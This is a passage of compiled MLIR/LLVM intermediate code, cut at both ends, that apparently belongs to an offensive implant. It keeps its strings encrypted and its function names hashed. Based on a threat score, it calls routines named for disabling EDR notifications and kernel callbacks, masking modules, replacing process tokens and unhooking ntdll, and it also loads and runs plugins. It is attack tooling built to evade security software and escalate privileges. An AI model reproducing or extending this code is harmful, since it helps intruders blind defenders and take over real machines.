    %7 = llvm.mlir.constant(8.000000e-01 : f64) : f64
    %8 = llvm.mlir.constant(5.000000e-01 : f64) : f64
    %9 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    %18 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.mlir.addressof @ai_init : !llvm.ptr
    %21 = llvm.call %20() : !llvm.ptr, () -> i32
    %22 = llvm.mlir.addressof @ai_collect_telemetry : !llvm.ptr
    %23 = llvm.call %22() : !llvm.ptr, () -> !llvm.ptr
    %24 = llvm.call @ai_score_threat() : () -> f64
    llvm.store %24, %3 {alignment = 8 : i64} : f64, !llvm.ptr
    %25 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %28 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %29 = llvm.fptosi %28 : f64 to i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %33 = llvm.fcmp "ogt" %32, %7 : f64
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %34 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %36 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %37 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %38 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %39 = llvm.fptosi %38 : f64 to i64
    %40 = llvm.call @string(%39) : (i64) -> !llvm.ptr
    %41 = llvm.call @jocky_str_concat(%37, %40) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %42 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @f_0218a827(%35, %36, %41, %42) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb2:  // pred: ^bb0
    %43 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %44 = llvm.fcmp "ogt" %43, %8 : f64
    llvm.cond_br %44, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %45 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    %46 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %47 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %48 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %50 = llvm.fptosi %49 : f64 to i64
    %51 = llvm.call @string(%50) : (i64) -> !llvm.ptr
    %52 = llvm.call @jocky_str_concat(%48, %51) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %53 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%46, %47, %52, %53) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb4:  // pred: ^bb2
    %54 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    %55 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %56 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %57 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %58 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %59 = llvm.fptosi %58 : f64 to i64
    %60 = llvm.call @string(%59) : (i64) -> !llvm.ptr
    %61 = llvm.call @jocky_str_concat(%57, %60) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %62 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    llvm.call @f_0218a827(%55, %56, %61, %62) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb1, ^bb5
    %63 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_97a724e0() {
    %0 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    %3 = llvm.mlir.constant(1 : i32) : i32
    %4 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %5 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %6 = llvm.mlir.constant(8.000000e-01 : f64) : f64
    %7 = llvm.mlir.constant(5.000000e-01 : f64) : f64
    %8 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    %14 = llvm.mlir.constant(2 : i32) : i32
    %15 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    %16 = llvm.mlir.constant(0.69999999999999996 : f64) : f64
    %17 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    %18 = llvm.mlir.constant(3 : i32) : i32
    %19 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    %21 = llvm.mlir.constant(4 : i32) : i32
    %22 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    %30 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    %31 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    %32 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %33 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %34 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %36 = llvm.alloca %3 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %35, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.alloca %3 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %1, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %38 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @array_len(%38) : (!llvm.ptr) -> i64
    %40 = llvm.sext %1 : i32 to i64
    %41 = llvm.icmp "sgt" %39, %40 : i64
    llvm.cond_br %41, ^bb1, ^bb5
  ^bb1:  // pred: ^bb0
    %42 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    %43 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %44 = llvm.getelementptr %43[%1] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %45 = llvm.load %44 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %46 = llvm.call @jocky_str_concat(%42, %45) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %48 = llvm.fcmp "ogt" %47, %16 : f64
    llvm.cond_br %48, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %49 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %50, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %21, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %51 = llvm.mlir.addressof @btr_disable_notifications : !llvm.ptr
    %52 = llvm.call %51() : !llvm.ptr, () -> i1
    %53 = llvm.getelementptr %22[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %54 = llvm.mlir.addressof @btr_mask_module : !llvm.ptr
    %55 = llvm.call %54(%53) : !llvm.ptr, (!llvm.ptr) -> i1
    %56 = llvm.getelementptr %23[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %57 = llvm.mlir.addressof @btr_mask_module : !llvm.ptr
    %58 = llvm.call %57(%56) : !llvm.ptr, (!llvm.ptr) -> i1
    %59 = llvm.getelementptr %24[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    %60 = llvm.mlir.addressof @jocky_exploit_disable_callbacks : !llvm.ptr
    %61 = llvm.call %60() : !llvm.ptr, () -> i32
    %62 = llvm.mlir.addressof @jocky_exploit_token_replacement : !llvm.ptr
    %63 = llvm.call %62(%1, %1) : !llvm.ptr, (i32, i32) -> i32
    %64 = llvm.getelementptr %25[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %65 = llvm.getelementptr %26[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %66 = llvm.getelementptr %27[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %67 = llvm.getelementptr %28[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @f_0218a827(%64, %65, %66, %67) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb3:  // pred: ^bb1
    %68 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    %69 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.store %69, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %18, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %70 = llvm.mlir.addressof @btr_disable_notifications : !llvm.ptr
    %71 = llvm.call %70() : !llvm.ptr, () -> i1
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb12
  ^bb5:  // pred: ^bb0
    %72 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %73 = llvm.fcmp "ogt" %72, %6 : f64
    llvm.cond_br %73, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %74 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%74) : (!llvm.ptr) -> ()
    %75 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    llvm.store %75, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %14, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %76 = llvm.mlir.addressof @edrhoker_detect : !llvm.ptr
    %77 = llvm.call %76() : !llvm.ptr, () -> i1
    %78 = llvm.mlir.addressof @blindside_unhook_ntdll : !llvm.ptr
    %79 = llvm.call %78() : !llvm.ptr, () -> i1
    llvm.br ^bb11
  ^bb7:  // pred: ^bb5
    %80 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %81 = llvm.fcmp "ogt" %80, %7 : f64
    llvm.cond_br %81, ^bb8, ^bb9
  ^bb8:  // pred: ^bb7
    %82 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%82) : (!llvm.ptr) -> ()
    %83 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    llvm.store %83, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %3, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb10
  ^bb9:  // pred: ^bb7
    %84 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%84) : (!llvm.ptr) -> ()
    %85 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.store %85, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %1, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    llvm.br ^bb11
  ^bb11:  // 2 preds: ^bb6, ^bb10
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb4, ^bb11
    %86 = llvm.getelementptr %29[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %87 = llvm.load %36 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %88 = llvm.call @jocky_str_concat(%86, %87) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%88) : (!llvm.ptr) -> ()
    %89 = llvm.getelementptr %30[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %90 = llvm.getelementptr %31[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %91 = llvm.load %36 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %92 = llvm.getelementptr %32[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%89, %90, %91, %92) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %93 = llvm.getelementptr %33[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%93) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_c1c92895() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    %5 = llvm.mlir.constant(0 : i64) : i64
    %6 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %13 = llvm.mlir.constant(1 : i64) : i64
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    %18 = llvm.alloca %0 x !llvm.array<2 x ptr> {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x ptr>
    llvm.store %17, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %20 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %21 = llvm.getelementptr %18[%2, %0] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x ptr>
    llvm.store %20, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %22 = llvm.bitcast %18 : !llvm.ptr to !llvm.ptr
    llvm.store %22, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %23 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %24 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %25 = llvm.call @array_len(%24) : (!llvm.ptr) -> i64
    %26 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %5, %26 {alignment = 4 : i64} : i64, !llvm.ptr
    %27 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %28 = llvm.load %26 {alignment = 4 : i64} : !llvm.ptr -> i64
    %29 = llvm.icmp "slt" %28, %25 : i64
    llvm.cond_br %29, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %30 = llvm.bitcast %24 : !llvm.ptr to !llvm.ptr
    %31 = llvm.getelementptr %30[%28] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %32 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %32, %27 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.call @plugin_load(%33) : (!llvm.ptr) -> i64
    llvm.store %34, %15 {alignment = 4 : i64} : i64, !llvm.ptr
    %35 = llvm.load %15 {alignment = 4 : i64} : !llvm.ptr -> i64
    %36 = llvm.sext %2 : i32 to i64
    %37 = llvm.icmp "sgt" %35, %36 : i64
    llvm.cond_br %37, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %38 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %39 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @jocky_str_concat(%38, %39) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.load %15 {alignment = 4 : i64} : !llvm.ptr -> i64
    %42 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    llvm.call @plugin_run(%41, %42) : (i64, !llvm.ptr) -> ()
    %43 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %44 = llvm.add %43, %0 : i32
    llvm.store %44, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %45 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %46 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %47 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %48 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%45, %46, %47, %48) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %49 = llvm.add %28, %13 : i64
    llvm.store %49, %26 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %50 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %51 = llvm.icmp "eq" %50, %2 : i32
    llvm.cond_br %51, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %52 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %53 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_fe69c41f() -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(2 : i32) : i32
    %7 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    %8 = llvm.mlir.constant(3 : i32) : i32
    %9 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(4 : i32) : i32
    %11 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    %12 = llvm.mlir.constant(5 : i32) : i32
    %13 = llvm.mlir.zero : !llvm.ptr
    %14 = llvm.mlir.constant(0 : i64) : i64
    %15 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    %21 = llvm.mlir.constant(1 : i64) : i64
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %25 = llvm.alloca %0 x !llvm.array<6 x ptr> {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %24, %26 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %25[%2, %0] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %27, %28 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %29 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %30 = llvm.getelementptr %25[%2, %6] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %29, %30 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %31 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %32 = llvm.getelementptr %25[%2, %8] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %31, %32 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %34 = llvm.getelementptr %25[%2, %10] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %33, %34 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %35 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %36 = llvm.getelementptr %25[%2, %12] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %35, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.bitcast %25 : !llvm.ptr to !llvm.ptr
    llvm.store %37, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %38 = llvm.bitcast %13 : !llvm.ptr to !llvm.ptr
    %39 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %38, %39 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %40 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %41 = llvm.call @array_len(%40) : (!llvm.ptr) -> i64
    %42 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %14, %42 {alignment = 4 : i64} : i64, !llvm.ptr
    %43 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %44 = llvm.load %42 {alignment = 4 : i64} : !llvm.ptr -> i64
    %45 = llvm.icmp "slt" %44, %41 : i64
    llvm.cond_br %45, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %46 = llvm.bitcast %40 : !llvm.ptr to !llvm.ptr
    %47 = llvm.getelementptr %46[%44] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %48 = llvm.load %47 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %48, %43 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %49 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %50 = llvm.call @fs_exists(%49) : (!llvm.ptr) -> i1
    llvm.cond_br %50, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %51 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
